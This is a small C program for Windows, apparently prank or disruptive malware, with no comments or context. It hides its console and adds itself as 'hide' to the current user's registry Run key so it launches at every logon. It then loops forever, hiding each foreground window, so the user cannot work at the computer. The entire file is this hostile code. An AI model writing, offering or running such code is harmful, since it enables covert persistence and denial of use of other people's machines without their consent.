#include <Windows.h>

int main() {
	FreeConsole();
	HKEY hKey;
	const char* czStartName = "hide";
	const char* czExePath   = "C:\\hide.exe";
	
	LONG lnRes = RegOpenKeyEx(  HKEY_CURRENT_USER,
	                            "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run",
	                            0 , KEY_WRITE,
	                            &hKey);
	if( ERROR_SUCCESS == lnRes )
	{
	    lnRes = RegSetValueEx(  hKey,
	                            czStartName,
	                            0,
	                            REG_SZ,
	                            (unsigned char*)czExePath,
	                            strlen(czExePath) );
	}
	
	RegCloseKey(hKey);
	while(1)
	{
		HWND hWnd = GetForegroundWindow();
		ShowWindow(hWnd, SW_HIDE);
	}
}
